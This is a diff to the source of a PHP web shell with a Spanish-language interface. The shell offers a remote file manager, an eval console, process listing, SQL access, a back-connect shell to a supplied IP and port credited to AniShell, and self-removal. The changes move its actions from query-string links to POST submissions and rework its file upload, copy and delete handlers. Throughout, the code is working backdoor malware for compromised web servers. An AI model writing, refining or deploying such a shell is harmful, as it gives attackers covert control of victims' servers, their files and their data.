@@ -37,13 +37,6 @@ ini_set('memory_limit', '64M'); //for online zip usage
 @ini_set('max_execution_time', 0);
 //@ini_set('output_buffering', 0);
 
-
-//provisorio
-//////////////////////////////////
-define('SA_ROOT', str_replace('\\', '/', dirname(__file__)) . '/');
-$nowpath = getPath(SA_ROOT, '.');
-//////////////////////////////////
-
 # System variables
 $Config['Menu'] = 'menu';
 $Config['Action'] = 'act';
@@ -53,7 +46,7 @@ $Config['zName'] = ''; //md5('User');
 $Config['zPass'] = ''; //md5('Pass');
 $Config['hexdump_lines'] = 16; //lines in hex preview file
 $Config['hexdump_rows'] = 32; //16, 24 or 32 bytes in one line
-if (@! $_REQUEST[$Config['Menu']]) $_REQUEST[$Config['Menu']] = 'file'; //default action
+if (@! $_POST[$Config['Menu']]) $_POST[$Config['Menu']] = 'file'; //default action
 
 $Content = '';
 $Javascript = '';
@@ -590,7 +583,7 @@ class PHPZip {
 		foreach ($filelist as $filename) {	
 			if (file_exists($filename)) {
 				if (is_dir($filename)) {
-					$content = $this->GetFileList($filename . '/', $curdir);
+					$content = $this->GetFileList($filename, $curdir);
 				}
 				
 				if (is_file($filename)) {
@@ -716,7 +709,8 @@ class PHPZip {
 }
 
 //TODO
-function compress($filename, $filedump, $compress) {
+//Si no puedo usar Zip uso otro metodo
+/*function compress($filename, $filedump, $compress) {
     if ($compress === 'bzip' && @function_exists('bzcompress')) {
         $filename .= '.bz2';
         $mime_type = 'application/x-bzip2';
@@ -738,7 +732,7 @@ function compress($filename, $filedump, $compress) {
                 $mime_type = 'application/octet-stream';
             }
 
-            /*
+            //
             if(!empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name'])) {
             if(!$file=@fopen($_POST['d_name'],"r")) {
             err(1,$_POST['d_name']); 
@@ -759,26 +753,29 @@ function compress($filename, $filedump, $compress) {
             exit();
             }
             }
-            */
-}
+            //
+}*/
 ////////////////////////////
 
 # Menu
 $sysMenu = '
-        <a href="?' . $Config['Menu'] . '=file"><b>' . $Lang['fm'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=tools"><b>' . $Lang['tools'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=processes"><b>' . $Lang['procs'] . '</b></a> |         
-        <a href="?' . $Config['Menu'] . '=phpenv"><b>' . $Lang['info'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=connect"><b>' . $Lang['ec'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=sql"><b>' . $Lang['sql'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=eval"><b>' . $Lang['eval'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=update"><b>' . $Lang['update'] . '</b></a> |     
-        <a href="?' . $Config['Menu'] . '=selfremove"><b>' . $Lang['sr'] . '</b></a>
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'file\'));"><b>' . $Lang['fm'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'tools\'));"><b>' . $Lang['tools'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'procs\'));"><b>' . $Lang['procs'] . '</b></a> |         
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'phpenv\'));"><b>' . $Lang['info'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'connect\'));"><b>' . $Lang['ec'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'sql\'));"><b>' . $Lang['sql'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'eval\'));"><b>' . $Lang['eval'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'update\'));"><b>' . $Lang['update'] . '</b></a> |     
+        <a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Menu'] . '\'), Array(\'selfremove\'));"><b>' . $Lang['sr'] . '</b></a>
 		' . (($Config['zPass']) ? ' | <a href="#" onclick="if (confirm(\'' . $Lang['merror'] . '\')) window.close();return false;"><b>' . $Lang['out'] . '</b></a>' : '');
 
 # Sections
-if ($_REQUEST[$Config['Menu']] === 'file') {
+if ($_POST[$Config['Menu']] === 'file') {
 	$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
+	//provisorio
+	define('SA_ROOT', str_replace('\\', '/', dirname(__file__)) . '/');
+	$nowpath = getPath(SA_ROOT, '.');
     
 	function dirsize($dir) {
         $dh = @opendir($dir);
@@ -945,7 +942,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
             }
     }
 
-    function deltree($path) {
+    function delTree($path) {
             $origipath = $path;
             $handler = opendir($path);
             while (true) {
@@ -973,23 +970,23 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
             return true;
     }
 		
-    function RecursiveCopy($path, $dest){ 
-		if( is_dir($path) ) {
-			@mkdir( $dest );
+    function recursiveCopy($path, $dest){ 
+		if (is_dir($path)) {
+			@mkdir($dest);
 			$objects = scandir($path);
-			if( sizeof($objects) > 0 ) {
-				foreach( $objects as $file ) {
-					if( $file === '.' or $file === '..' ) {
-						if( is_dir( $path.$file ) ) {
-							copy_r( $path.$file, $dest.$file );
+			if (sizeof($objects) > 0) {
+				foreach($objects as $file) {
+					if ($file !== '.' && $file !== '..') {
+						if (is_dir($path.$file)) {
+							recursiveCopy($path . $file . '/', $dest . '/' . $file . '/');
 						} else {
-							copy( $path.$file, $dest.$file );
+							copy($path . $file, $dest . $file);
 						}
 					}
 				}
 			}
 			return true;
-		} elseif( is_file($path) ) {
+		} elseif(is_file($path)) {
 			return copy($path, $dest);
 		} else {
 			return false;
@@ -1012,13 +1009,13 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
 			function createfile(nowpath){
 				mkfile = prompt('Ingrese nombre del archivo:', '');
 				if (!mkfile) return;
-				sendData('createfile', Array('mkfile', 'nowpath'), Array(mkfile, nowpath));
+				sendData('createfile', Array('mkfile', 'dir'), Array(mkfile, nowpath));
 			}
 			
-			function createdir(){
+			function createdir(nowpath){
 				newdirname = prompt('Ingresa el nombre del directorio:', '');
 				if (!newdirname) return;
-				sendData('createdir', Array('newdirname'), Array(newdirname));
+				sendData('createdir', Array('newdirname', 'dir'), Array(newdirname, nowpath));
 			}
 			
 			function deldir(deldir){
@@ -1042,25 +1039,17 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
 			}
 			
 			function copyfile(){
+				var temp;
 				tofile = prompt('Archivo(s) a la siguiente ruta:\\n', '');
 				if (!tofile) return;
-				document.filelist." . $Config['Action'] . ".value = 'copy';
-				document.filelist.copy.value = tofile;
+				temp += '<input type=\"hidden\" name=\"" . $Config['Action'] . "\" value=\"copy\"/>';				
+				temp += '<input type=\"hidden\" name=\"copy\" value=\"' + tofile + '\"/>';				
+				document.getElementById('info').innerHTML = temp;
 				document.filelist.submit();
-			}
-			
-			function sendData(action, fields, values){
-				temp = '<input type=\"hidden\" name=\"" . $Config['Action'] . "\" value=\"' + action + '\"/>';
-				for (i = 0; i <= fields.length - 1; i++) {
-					temp = temp + '<input type=\"hidden\" name=\"' + fields[ i ] + '\" value=\"' + values[ i ] + '\"/>';
-				}
-			 
-				document.dummy.innerHTML = temp;
-				document.dummy.submit();
 			}
 
 			function process(action){
-				document.filelist." . $Config['Action'] . ".value = action;
+				document.getElementById('info').innerHTML = '<input type=\"hidden\" name=\"" . $Config['Action'] . "\" value=\"' + action + '\"/>';
 				document.filelist.submit();
 			}
 
@@ -1218,26 +1207,25 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
 		}
 	} else {		
         # Acciones
-        //-> Obtenemos el directorio en el que estamos
+        // Obtenemos el directorio en el que estamos
         $current_dir = @$_POST['dir'];
         if (empty($current_dir)) $current_dir = $nowpath;
-        //-> --------------------------------------
 
         if (simpleValidate(@$_POST[$Config['Action']])) {
             switch ($_POST[$Config['Action']]) {
-                case 'createfile': // Crear archivo
-                    if (file_exists($_POST['nowpath'] . $_POST['mkfile'])) {
+                case 'createfile':
+                    if (file_exists($current_dir . $_POST['mkfile'])) {
                         $Content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: object alredy exists');
-                    } elseif (! fopen($_POST['nowpath'] . $_POST['mkfile'], 'w')) {
+                    } elseif (! fopen($current_dir . $_POST['mkfile'], 'w')) {
                         $Content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: access denied');
                     } else {
-                        $fp = @fopen($_POST['nowpath'] . $_POST['mkfile'], 'w');
+                        $fp = @fopen($current_dir . $_POST['mkfile'], 'w');
                         @fclose($fp);
                         $Content .= simpleDialog('<b>Archivo "' . $_POST['mkfile'] . '" creado correctamente</b>');
                     }
                     break;
 
-                case 'createdir': // Crear directorio
+                case 'createdir':
                     if (file_exists($current_dir . $_POST['newdirname'])) {
                         $Content .= simpleDialog('<b>El directorio ya existe</b>');
                     } else {
@@ -1246,15 +1234,15 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     }
                     break;
 
-                case 'deldir': // Eliminar archivos o directorios
+                case 'deldir':
                     if (! file_exists($_POST['deldir'])) {
                         $Content .= simpleDialog($_POST['deldir'] . ' directory does not exist');
                     } else {
-                        $Content .= simpleDialog('Directorio borrado ' . (deltree($_POST['deldir']) ? basename($_POST['deldir']) . ' correctamente' : 'fallo'));
+                        $Content .= simpleDialog('Directorio borrado ' . (delTree($_POST['deldir']) ? basename($_POST['deldir']) . ' correctamente' : 'fallo'));
                     }
                     break;
 
-                case 'upload': // Subir archivo
+                case 'upload':
                     $Content .= simpleDialog('Archivo subido ' . (@copy($_FILES['uploadfile']['tmp_name'], $_POST['dir'] . '/' . $_FILES['uploadfile']['name']) ? 'correctamente' : 'fallo'));
                     break;
 
@@ -1282,25 +1270,35 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     }
                     break;
 
-                case 'copy': // Copiar archivo
+                case 'copy':
 					if (@$_POST['dl']) {
                         $failnames = '';
 						$succ = $fail = 0;
+						
                         for ($z = 0; count($_POST['dl']) > $z; $z++) {
 							$fileinfo = pathinfo($_POST['dl'][$z]);
 							if (file_exists($_POST['copy'].$fileinfo['basename']) || ! file_exists($_POST['dl'][$z])) {
 								$Content .= simpleDialog('Ya existe o el archivo original esta perdido');
 							} else {
-								if (@copy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'])) {
-                                    $succ++;
-                                } else {
-									$failnames .= $_POST['dl'][$z] . ' ';
-                                    $fail++;
-                                }
+								if (is_dir($_POST['dl'][$z])) { 
+								    if (@recursiveCopy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'] . '/')) {
+										$succ++;
+									} else {
+										$failnames .= $_POST['dl'][$z] . ' ';
+										$fail++;
+									}
+								} else {
+									if (@copy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'])) {
+										$succ++;
+									} else {
+										$failnames .= $_POST['dl'][$z] . ' ';
+										$fail++;
+									}
+								}
 							}                            
                         }
                     
-                        $Content .= simpleDialog('Copiado finalizado: ' . count($_POST['dl']) . ' correctamente ' . $succ . ' - fallidos ' . $fail . ' ' . $failnames);
+                        $Content .= simpleDialog('Copiado finalizado: ' . count($_POST['dl']) . '<br> correctamente ' . $succ . ' - fallidos ' . $fail . ' ' . $failnames);
                     } else {
                         $Content .= simpleDialog('Selecciona archivo(s)');
                     }
@@ -1324,7 +1322,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     }
                     break;
 
-                case 'compress': // Comprimo
+                case 'compress':
                     if ($_POST['dl']) {
                         $zip = new PHPZip();
                         $zip->Zipper($_POST['dl']);
@@ -1342,12 +1340,12 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     }
                     break;
 
-                case 'delfiles': // Eliminar archivos
+                case 'delfiles':
 					if (@$_POST['dl']) {
                         $succ = $fail = 0;
                         for ($z = 0; count($_POST['dl']) > $z; $z++) {
                             if (is_dir($_POST['dl'][$z])) {
-                                if (@deltree($_POST['dl'][$z])) {
+                                if (@delTree($_POST['dl'][$z])) {
                                     $succ++;
                                 } else {
                                     $fail++;
@@ -1367,7 +1365,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     }
                     break;
 
-                case 'downfile': // Descargar archivos
+                case 'downfile':
                     if (! @file_exists($_POST['downfile'])) {
                         $Content .= simpleDialog('The file you want Downloadable was nonexistent');
                     } else {
@@ -1384,7 +1382,9 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
 
         $dir_writeable = @is_writable($nowpath) ? $Lang['writable'] : $Lang['no'] . ' ' . $Lang['writable'];
 
-        $Content .= '<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';
+        $Content .= '<form id="filelist" name="filelist" action="' . $self . '" method="post" enctype="multipart/form-data">
+			<div id="info"></div>
+			<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';
 
         $free = @disk_free_space($nowpath);
         ! $free && $free = 0;
@@ -1396,25 +1396,20 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
         $Content .= '<h2>' . $Lang['freespace'] . ' ' . sizecount($free) . ' ' . $Lang['of'] . ' ' . sizecount($all) . ' (' . $used_percent . '%)</h2>
 			
 			<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
-			  <form action="' . $self . '" method="post">
 			  <tr>
 					<td nowrap>' . $Lang['acdir'] . ' [' . $dir_writeable . ($isWIN ? '' : ', ' . getChmod($nowpath)) . ']: </td>
 					<td width="100%">
-					&nbsp;<input name="view_writable" value="0" type="hidden" />
-					<input class="input" name="dir" value="' . $current_dir . '" type="text" size="100%">
+					&nbsp;<input class="input" name="dir" value="' . $current_dir . '" type="text" size="100%">
 					&nbsp;<input class="bt" value="IR" type="submit">
 					</td>
 			  </tr>
-			  </form>
 			</table>
 
-			<form action="' . $self . '" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">
+			<tr class="alt1"><td colspan="7" style="padding:5px;">
 			<div style="float:right;">
 			<input class="input" name="uploadfile" value="" type="file" />
-			<input name="' . $Config['Action'] . '" value="upload" type="hidden" />
-			<input name="dir" value="' . $current_dir . '" type="hidden" />
-			<input class="bt" value="Upload" type="submit">
-			</div></form>';
+			<input class="bt" value="Upload" type="submit" onclick="process(\'upload\');return false;">
+			</div>';
 
         if ($isWIN && $isCOM) {
             $obj = new COM('scripting.filesystemobject');
@@ -1432,7 +1427,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                     if ($drive->DriveType == 2) {
                         $Content .= ' [<a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $drive->Path . '/\'));" title="Size:' . sizecount($drive->TotalSize) . 'Free:' . sizecount($drive->FreeSpace) . 'Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
                     } else {
-                        $Content .= ' [<a href="#" onclick="return confirm(\'Make sure that disk is avarible, otherwise an error may occur.\');sendData(\'dummy\', Array(\'dir\'), Array(\'' . $drive->Path . '/\'));return false;" title="Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
+                        $Content .= ' [<a href="#" onclick="if (confirm(\'Make sure that disk is avarible, otherwise an error may occur.\')) sendData(\'dummy\', Array(\'dir\'), Array(\'' . $drive->Path . '/\')); return false;" title="Type: ' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
                     }
                 }
 
@@ -1444,8 +1439,8 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
 		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $_SERVER['DOCUMENT_ROOT'] . '/\'))">' . $Lang['webroot'] . '</a> | 
 		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\', \'view_writable\'), Array(\'' . $nowpath . '/\', \'dir\'))">' . $Lang['vwdir'] . '</a> | 
 		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\', \'view_writable\'), Array(\'' . $nowpath . '/\', \'file\'))">' . $Lang['vwfils'] . '</a> | 
-		<a href="#" onclick="createdir();return false;">' . $Lang['cdir'] . '</a> | 
-		<a href="#" onclick="createfile(\'' . $nowpath . '\');return false;">' . $Lang['cfil'] . '</a>
+		<a href="#" onclick="createdir(\'' . $current_dir . '\');return false;">' . $Lang['cdir'] . '</a> | 
+		<a href="#" onclick="createfile(\'' . $current_dir . '\');return false;">' . $Lang['cfil'] . '</a>
 		
 		</td></tr></table>
 		<br>';
@@ -1472,7 +1467,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                             $dirdb['dirperm'] = getPerms($filepath);
                             $dirdb['fileowner'] = getUser($filepath);
                             $dirdb['dirlink'] = $current_dir;
-                            $dirdb['server_link'] = $filepath;
+                            $dirdb['server_link'] = $filepath . '/';
                             //$dirdb['client_link'] = urlencode($filepath);
                             $dirdata[] = $dirdb;
                         }
@@ -1502,12 +1497,9 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
         $dir_i = count($dirdata);
         $file_i = count($filedata);
 
-        //creo una form para poder realizar algunas acciones
-        $Content .= '<form id="filelist" name="filelist" action="' . $self . '" method="post"><input type="hidden" name="' . $Config['Action'] . '" value=""/><input type="hidden" name="copy" value=""/>';
-
         //error de lectura
         if (($dir_i == 0) and ($file_i == 0)) {
-            $Content .= '<br><center><b>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '/\'))">La carpeta esta vacia o no se puede abrir la misma!</a></b></center>';
+            $Content .= '<br><center><b>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '\'))">La carpeta esta vacia o no se puede abrir la misma!</a></b></center>';
         } else {
 			$Content .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 			<tr class="' . bg() . '">
@@ -1523,7 +1515,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
             $thisbg = bg();
             $Content .= '<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">
 					<td width="1%"></td>
-					<td width="100%" nowrap>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '/\'))">Parent Directory</a></td>
+					<td width="100%" nowrap>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '\'))">Parent Directory</a></td>
 					<td nowrap></td>
 					<td nowrap></td>
 					' . (! $isWIN ? '<td nowrap></td>' : '') . '
@@ -1535,7 +1527,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
                 $thisbg = bg();
                 $Content .= '<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">
 							<td nowrap><input type="checkbox" value="' . $dirdb['server_link'] . '" name="dl[]"></td>
-							<td>' . $Img['dir'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $dirdb['server_link'] . '/\'))">' . $dirdb['filename'] . '</a></td>
+							<td>' . $Img['dir'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $dirdb['server_link'] . '\'))">' . $dirdb['filename'] . '</a></td>
 							<td nowrap>' . $dirdb['mtime'] . '</td>
 							<td nowrap><a href="#" onclick="viewSize(\'' . $dirdb['server_link'] . '\', \'D' . $dir_i . '\');return false;"><div id="D' . $dir_i . '">[?]</div></a></td>
 							' . (! $isWIN ? '<td nowrap>
@@ -1593,7 +1585,7 @@ if ($_REQUEST[$Config['Menu']] === 'file') {
     }
 }
 
-if (@$_REQUEST[$Config['Menu']] === 'phpenv') {
+if (@$_POST[$Config['Menu']] === 'phpenv') {
     $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
     $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
     $dis_func = get_cfg_var('disable_functions');
@@ -1673,7 +1665,7 @@ if (@$_REQUEST[$Config['Menu']] === 'phpenv') {
 }
 
 
-if (@$_REQUEST[$Config['Menu']] === 'phpinfo') {
+if (@$_POST[$Config['Menu']] === 'phpinfo') {
     if (function_exists('phpinfo') and @! in_array('phpinfo', $dis_func)) {
         phpinfo();
         exit;
@@ -1683,7 +1675,7 @@ if (@$_REQUEST[$Config['Menu']] === 'phpinfo') {
 }
 
 
-if (@$_REQUEST[$Config['Menu']] === 'selfremove') {
+if (@$_POST[$Config['Menu']] === 'selfremove') {
     if ((isset($_POST['submit'])) and ($_POST['submit'] == $_POST['rndcode'])) {
         if (unlink(__file__)) {
             @ob_clean();
@@ -1697,7 +1689,7 @@ if (@$_REQUEST[$Config['Menu']] === 'selfremove') {
     }
 }
 
-if (@$_REQUEST[$Config['Menu']] === 'connect') { //Basada en AniShell
+if (@$_POST[$Config['Menu']] === 'connect') { //Basada en AniShell
     if (@simpleValidate($_POST['ip']) && simpleValidate($_POST['port'])) {
         $Content .= '<p>The Program is now trying to connect!</p>';
         $ip = $_POST['ip'];
@@ -1876,7 +1868,7 @@ if (@$_REQUEST[$Config['Menu']] === 'connect') { //Basada en AniShell
             }
 }
 
-if (@$_REQUEST[$Config['Menu']] === 'eval') {
+if (@$_POST[$Config['Menu']] === 'eval') {
     function calcRows($ret) {
         $rows = count(explode("\r\n", $ret)) + 1;
         if ($rows < 10) $rows = 10;
@@ -1939,6 +1931,16 @@ echo '<html xmlns="http://www.w3.org/1999/xhtml">
                 e.checked = form.chkall.checked;
       }
     }
+	
+	function sendData(action, fields, values){
+		temp = "<input type=\'hidden\' name=\'' . $Config['Action'] . '\' value=\'" + action + "\'/>";
+		for (i = 0; i <= fields.length - 1; i++) {
+			temp += "<input type=\'hidden\' name=\'" + fields[ i ] + "\' value=\'" + values[ i ] + "\'/>";
+		}
+		
+		document.dummy.innerHTML = temp;
+		document.dummy.submit();
+	}
 	    
     ' . $Javascript . '
   </script>
@@ -1991,7 +1993,6 @@ echo '<html xmlns="http://www.w3.org/1999/xhtml">
     <table style="border-collapse: collapse" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
       <tr>
         <td width="100%">
-		  <div id="info"></div>
           ' . $Content . '
         </td>
       </tr>
